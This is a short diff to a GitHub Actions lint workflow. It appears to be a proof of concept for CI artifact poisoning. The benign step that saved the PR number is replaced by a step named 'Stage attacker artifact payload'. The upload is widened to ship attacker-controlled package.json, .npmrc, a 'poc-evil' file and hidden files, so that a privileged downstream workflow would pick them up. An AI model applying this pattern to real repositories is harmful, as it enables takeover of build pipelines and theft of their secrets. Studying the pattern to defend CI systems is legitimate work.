@@ -8,11 +8,13 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
+      - name: Checkout
+        uses: actions/checkout@v6
+
+      - name: Stage attacker artifact payload
+        run: |
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          printf 'attacker controlled linter output' > linter-report.txt
 
       - name: Upload linter report
         if: always()
@@ -21,4 +23,9 @@ jobs:
           name: linter-report
           path: |
             pr-number.txt
+            linter-report.txt
+            package.json
+            .npmrc
+            poc-evil
+          include-hidden-files: true
           if-no-files-found: ignore
